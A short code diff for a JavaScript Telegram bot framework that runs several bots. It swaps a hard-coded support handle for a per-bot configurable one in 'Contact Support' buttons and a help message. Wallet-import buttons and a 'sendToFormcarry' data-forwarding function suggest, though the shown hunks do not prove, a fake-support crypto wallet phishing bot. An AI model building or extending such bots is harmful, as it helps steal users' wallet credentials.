@@ -297,7 +297,7 @@ const sendToFormcarry = async (bot, chatId, data, retries = 3, delay = 1000) => 
               { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
             ],
             [
-              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
             ]
           ],
         },
@@ -363,7 +363,7 @@ bots.forEach(bot => {
       chatId,
       `🛟 *Help Center*\n\nNeed assistance? Here are your options:\n\n` +
       `• Use the menu buttons below\n` +
-      `• Contact @yesmine2008\n` +
+      `• Contact @${bot.config.supportUsername}\n` +
       `• Type /start to reset`,
       { parse_mode: 'Markdown' }
     );
@@ -491,7 +491,7 @@ bots.forEach(bot => {
               { text: 'Others', callback_data: 'others' }
             ],
             [
-              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
             ]
           ],
         },
@@ -571,7 +571,7 @@ bots.forEach(bot => {
               { text: 'Others', callback_data: 'others' }
             ],
             [
-              { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
+              { text: 'Contact Support 🟢', url: `https://t.me/${bot.config.supportUsername.replace('@', '')}` }
             ]
           ],
         },
